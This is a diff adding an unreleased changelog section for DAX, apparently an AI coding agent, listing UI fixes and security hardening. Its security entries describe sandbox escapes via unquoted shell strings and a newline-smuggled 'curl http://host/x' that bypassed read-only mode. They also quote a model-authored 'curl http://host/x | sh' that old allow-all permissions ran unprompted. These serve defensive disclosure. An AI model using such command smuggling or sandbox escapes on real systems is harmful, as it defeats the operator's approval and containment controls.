@@ -7,6 +7,129 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Changed
+
+- **The session stream is readable.** Narration was rendered in `textMuted` with the terminal `DIM`
+  attribute on top, which measures 2.2:1 against the default theme - below even the large-text floor -
+  and only the newest row got full-strength text, so scrolling back through a session meant reading
+  dimmed prose. `DIM` is gone from the stream and history keeps the same weight as the live row.
+- One indent scale, so the phase rail no longer sits a column left of everything it contains; one
+  duration formatter, so the same run no longer reports both `1m 5s` and `1m 05s`; one status
+  vocabulary, replacing four dot glyphs, two crosses and two ellipses, with approval outcomes sharing
+  ✓ and ✗ deliberately. The turn separator draws a rule instead of rendering an empty box.
+- The footer drops a divider that was invisible at 1.03:1 and three of the four border columns each
+  key hint spent on a nested keycap, and labels plan mode `PLAN` - the name the agent, the command and
+  the permissions all use - instead of `CHAT`. Sixteen fractional layout values resolved to whole
+  cells; a character grid has no halves.
+- Each semantic colour has its own hue. Four roles in the default theme sat within 1.28 of each other,
+  so hue could not distinguish a heading from a link from a type. The `dax` theme's body text (3.67:1)
+  and error text (4.31:1) now clear 4.5:1.
+- The wordmark is drawn in the brand's violet-to-blue ramp rather than flat grey, and the dead
+  two-tone renderer behind it is gone.
+
+### Fixed
+
+- Building the stream no longer costs quadratic time: `suppressHeader` was computed by handing every
+  row the whole item array and scanning backwards from its own index, and is now one pass in the builder.
+
+### Changed
+
+- **Type-aware lint rules are on.** The config used typescript-eslint's `recommended`, not
+  `recommendedTypeChecked`, so every rule needing type information was off - including the family
+  that catches this codebase's actual mistakes. `no-floating-promises`, `no-misused-promises`,
+  `await-thenable` and a `no-restricted-imports` guard on `child_process` now run and surfaced 191
+  existing violations (148 floating promises, 37 `await` on non-thenables, 6 direct `child_process`
+  imports). Those are recorded in the suppressions ratchet so no *new* ones can be added; they are
+  tracked debt, not fixed. 82 of them are in `server/`, `session/`, `governance/`, `tool/`, `shell/`,
+  `mcp/`, `plugin/`, `worker/` and `execution/`.
+- `noImplicitOverride`, `noFallthroughCasesInSwitch` and `verbatimModuleSyntax` are enabled - each
+  was free. `noUncheckedIndexedAccess` and `exactOptionalPropertyTypes` are not: they surface 615 and
+  460 existing errors, so each is its own piece of work rather than a config edit.
+
+### Fixed
+
+- **Evidence digests were locale-dependent.** The canonicalizer sorted object keys with
+  `localeCompare` - locale-aware collation, not the lexicographic order the shared Flowright schema
+  specifies - and record ordering tie-broke the same way on mixed-case base62 ids, which decides the
+  `prevDigest` chain. The published `evidenceDigest` therefore depended on the machine's locale and
+  ICU version and could not be reproduced by the other side of the contract. Both now sort by code
+  point. Digests computed before this fix on a non-C locale may differ.
+- **Every run event minted in the same millisecond shared an id.** `createEvent` built its uniqueness
+  suffix with `.toString(36).slice(2, 11)` on a counter, which returns an empty string until the
+  counter passes 1296.
+- **A caller could overwrite run-event identity.** `run-gateway.appendEvent` spread the caller's
+  object last, so `eventId`, `sequence`, `cursor`, `runId` and `timestamp` - the fields ordering and
+  replay depend on - could be supplied from outside.
+- The TUI entrypoint used an async Promise executor, so a failure during startup was swallowed and
+  the process hung with no diagnostic instead of reporting the error.
+- `lazy` existed twice with different behaviour, and both copies were imported from inside the same
+  package. There is now one implementation.
+
+### Security
+
+- **The audit trail is now tamper-evident.** `dax audit` reads the `pm_rao_event` table, which was a
+  plain SQLite insert with no chaining - one `UPDATE` and the doctored history read back clean. Every
+  event now carries the hash-chain link that `crates/dax-ledger` defines, computed in TypeScript so
+  it works without the Rust sidecar, and cross-checked against the Rust implementation by a pinned
+  vector in both test suites. `dax verify audit` recomputes the chain and reports where it breaks.
+  Events written before this change have no digests: they are reported as unchained rather than
+  back-filled, because inventing chain history for records that were never chained would forge the
+  trail. The hash-chained ledger crate that shipped with no production caller is what backs it.
+- The ledger's own crate no longer leaves its timestamp outside the hash, appends under an exclusive
+  lock so two concurrent writers cannot brick the chain, and creates its files 0600.
+
+- **Sandbox wrappers no longer build a shell string.** Every provider assembled an argv array and
+  then joined it with spaces, so the result was re-parsed by the outer shell: the model-controlled
+  working directory was interpolated unquoted, and the seatbelt wrapper escaped only `"`, so a
+  backslash before a quote ended the argument early and the rest ran *outside* `sandbox-exec`. The
+  layer meant to contain a command was itself the injection sink. `wrap()` now returns argv and a
+  sandboxed run is spawned directly. The seatbelt invocation was also malformed - the working
+  directory sat where `sandbox-exec` expects the program - so strict sandboxing could not run at all.
+- **Read-only verification mode could be escaped with a newline.** The whitelist split commands on
+  `\s+`, so `npm test\ncurl http://host/x` parsed as `npm` with the arguments `curl` and a URL, both
+  of which passed the safe-target check. It was then executed with `shell: true`, where the newline
+  is a command separator. Separators are now refused outright and argument splitting no longer treats
+  a newline as whitespace.
+
+- **Workspace trust: a repository's executable configuration no longer runs on sight.** Opening a
+  repo and running `dax` used to execute whatever it declared: `.dax/plugin/*.ts` was imported and
+  every export called with `Bun.$` and an authenticated SDK client, `plugin` entries were installed
+  from npm and imported, local `mcp` servers were spawned, and `bun install` ran the repo's install
+  scripts. None of it prompted, and the `plugin` array was concatenated across config sources so a
+  user's own config could not remove a project entry. Project-scoped plugins, local MCP servers and
+  dependency installs are now withheld until the operator runs `dax trust`, and the decision is bound
+  to a digest of exactly what was withheld - adding a plugin to a trusted repo asks again. Global,
+  managed and user configuration are unaffected. `dax trust revoke` withdraws it.
+- **Local MCP servers no longer inherit the whole environment.** DAX harvests `.env` files from every
+  ancestor directory into its own environment, so spreading `process.env` handed every provider API
+  key and project secret to any server the configuration named. Child processes now get only the
+  variables a process needs to start; anything else is declared in that server's own `environment`
+  block. **Breaking:** an MCP server that relied on an inherited credential must now declare it.
+
+- **`POST /pty` no longer accepts a command, arguments or an environment.** A PTY exists to give the
+  operator an interactive shell; accepting those over HTTP made it unattended remote execution with a
+  caller-controlled environment. The shell is always the operator's own and `cwd` must resolve inside
+  the project. **Breaking:** those three fields are ignored.
+- **`POST /experimental/worktree` no longer accepts `startCommand`.** It was handed to `bash -lc`.
+  Configure `commands.start` on the project instead. **Breaking:** the field is removed.
+- **Configuration writes require the operator.** `PATCH /global/config`, `PATCH /project/:projectID`
+  and worktree creation all end in something DAX later executes - an MCP server `command`, a project
+  start script. They now accept only the in-process interface or an authenticated HTTP client, and
+  are refused outright when no server credential is configured.
+
+- **The default permission ruleset no longer grants everything.** The shipped default began with
+  `"*": "allow"`, so `shell`, `edit` and every tool contributed by an MCP server resolved to `allow`
+  and the approval surface never appeared: a model-authored `curl http://host/x | sh` executed with
+  no prompt. Permissions are now enumerated deliberately and `PolicyEngine.evaluate` falls back to
+  `ask`, so anything unlisted - including a permission added to DAX later - requires approval.
+  Approval is spent on execution (`shell`), on egress (`webfetch`, `websearch`, `codesearch`), and on
+  leaving the worktree (`external_directory`); reads and in-worktree edits stay quiet.
+  **Breaking:** operators who relied on the implicit allow will now see prompts. Configure
+  `permission` in `dax.json` to restore specific grants - an explicit rule still wins over the default.
+- `webfetch` and `websearch` were assigned a *file path* ruleset, so every URL matched its `"*": "allow"`
+  entry and the egress gate could never fire.
+
+
 ## [1.3.0] - 2026-08-14
 
 ### Added
